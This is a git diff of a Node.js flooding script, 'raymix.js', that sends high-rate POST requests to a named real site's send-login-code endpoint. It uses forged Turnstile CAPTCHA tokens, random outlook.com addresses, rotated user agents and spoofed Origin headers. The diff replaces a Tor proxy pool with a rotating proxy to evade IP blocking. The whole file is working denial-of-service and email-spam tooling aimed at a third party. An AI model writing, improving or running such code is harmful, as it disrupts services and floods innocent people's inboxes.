@@ -2,11 +2,11 @@ const cluster = require("cluster");
 const os = require("os");
 const axios = require("axios");
 const fs = require("fs");
-const { SocksProxyAgent } = require("socks-proxy-agent");
+const { HttpsProxyAgent } = require("https-proxy-agent");
 
 if (process.argv.length < 5) {
     console.log("Usage: node raymix.js <duration_seconds> <rps> <connections> [workers]");
-    console.log("Example: node raymix.js 120 2000 4");
+    console.log("Example: node raymix.js 120 800 4");
     process.exit(0);
 }
 
@@ -16,20 +16,19 @@ const CONNECTIONS = parseInt(process.argv[4]);
 const WORKERS = parseInt(process.argv[5] || os.cpus().length);
 
 const DEBUG = true;
-
-// ====================== MULTI-TOR PROXY POOL (5 ports) ======================
-const PROXY_PORTS = [9050, 9051, 9052, 9053, 9054];
-const agents = PROXY_PORTS.map(port => new SocksProxyAgent(`socks5://127.0.0.1:${port}`));
-
-let proxyIndex = 0;
-function getNextAgent() {
-    const agent = agents[proxyIndex % agents.length];
-    const port = PROXY_PORTS[proxyIndex % agents.length];
-    proxyIndex++;
-    return { agent, port };
-}
+const PROXY_URL = "http://localhost:5566";   // mattes/rotating-proxy
 
 let userAgents = [];
+try {
+    userAgents = fs.readFileSync("user-agents.txt", "utf8")
+                   .split("\n")
+                   .map(ua => ua.trim())
+                   .filter(ua => ua.length > 20);
+    console.log(`✅ Loaded ${userAgents.length} User-Agents`);
+} catch (e) {
+    console.error("user-agents.txt not found, using default");
+    userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
+}
 
 function generateMockTurnstileToken() {
     const randStr = (len) => {
@@ -40,39 +39,16 @@ function generateMockTurnstileToken() {
         }
         return result;
     };
-    const part1 = '0.' + randStr(250);
-    const part2 = randStr(22);
-    const part3 = randStr(64);
-    return `${part1}.${part2}.${part3}`;
-}
-
-try {
-    userAgents = fs.readFileSync("user-agents.txt", "utf8")
-                   .split("\n")
-                   .map(ua => ua.trim())
-                   .filter(ua => ua.length > 20);
-    console.log(`✅ Loaded ${userAgents.length} User-Agentsssssssssssssssssss`);
-} catch (e) {
-    console.error("user-agents.txt not found, using default");
-    userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"];
-}
-
-function randomString(len = 12) {
-    return Math.random().toString(36).substring(2, len + 2);
-}
-
-function getRandomUserAgent() {
-    return userAgents[Math.floor(Math.random() * userAgents.length)];
+    return `0.${randStr(250)}.${randStr(22)}.${randStr(64)}`;
 }
 
 // ====================== MASTER ======================
 if (cluster.isPrimary) {
-    console.log("\n=== MULTI-TOR ULTRA FREEZE (5 PROXIES) ===");
-    console.log(`Ports      : ${PROXY_PORTS.join(", ")}`);
-    console.log(`Duration   : ${DURATION}s`);
-    console.log(`RPS        : ${RPS}`);
-    console.log(`Connections: ${CONNECTIONS}`);
-    console.log(`Workers    : ${WORKERS}\n`);
+    console.log("\n=== MATTES ROTATING PROXY ULTRA FREEZE ===");
+    console.log(`Proxy     : ${PROXY_URL}`);
+    console.log(`Duration  : ${DURATION}s`);
+    console.log(`RPS       : ${RPS}`);
+    console.log(`Workers   : ${WORKERS}\n`);
 
     let totalReq = 0, totalOK = 0, totalErr = 0;
 
@@ -101,9 +77,10 @@ if (cluster.isPrimary) {
 
 // ====================== WORKER ======================
 (async () => {
+    const proxyAgent = new HttpsProxyAgent(PROXY_URL);
     let reqCount = 0, okCount = 0, errCount = 0;
 
-    console.log(`[Worker ${process.pid}] 🚀 Multi-Tor ready with ${PROXY_PORTS.length} proxies`);
+    console.log(`[Worker ${process.pid}] 🚀 Using mattes rotating proxy @ ${PROXY_URL}`);
 
     const INTERVAL = 100;
     const PER_TICK = Math.ceil(RPS / (1000 / INTERVAL));
@@ -113,19 +90,18 @@ if (cluster.isPrimary) {
         const batch = [];
 
         for (let i = 0; i < PER_TICK; i++) {
-            const { agent, port } = getNextAgent();
-            const rand = randomString(10);
+            const rand = Math.random().toString(36).substring(2, 12);
             const email = `${rand}@outlook.com`;
             const turnstyletoken = generateMockTurnstileToken();
 
             batch.push(
                 axios.post("https://api.aryankaushik.space/api/auth/send-login-code",
                 { email, turnstileToken: turnstyletoken }, {
-                    httpsAgent: agent,
-                    timeout: 8000,
+                    httpsAgent: proxyAgent,
+                    timeout: 15000,
                     headers: {
                         "Content-Type": "application/json",
-                        "User-Agent": getRandomUserAgent(),
+                        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
                         "Origin": "https://aeroweb.aryankaushik.space",
                         "Referer": "https://aeroweb.aryankaushik.space/"
                     }
@@ -133,16 +109,13 @@ if (cluster.isPrimary) {
                 .then((response) => {
                     okCount++; reqCount++;
                     if (DEBUG && Math.random() < 0.05) {
-                        console.log(`[W${process.pid}] ✅ [${port}] [${response.status}] ${JSON.stringify(response.data).slice(0,120)}`);
+                        console.log(`[W${process.pid}] ✅ [${response.status}]`);
                     }
                 })
                 .catch((error) => {
                     errCount++; reqCount++;
-                    if (DEBUG) {
-                        const status = error.response?.status || "TIMEOUT";
-                        const body = error.response?.data ? JSON.stringify(error.response.data).slice(0,200) : error.message;
-                        console.log(`[W${process.pid}] ❌ [${port}] [${status}] ${body}`);
-                    }
+                    const status = error.response?.status || "TIMEOUT";
+                    if (DEBUG) console.log(`[W${process.pid}] ❌ [${status}]`);
                 })
             );
         }
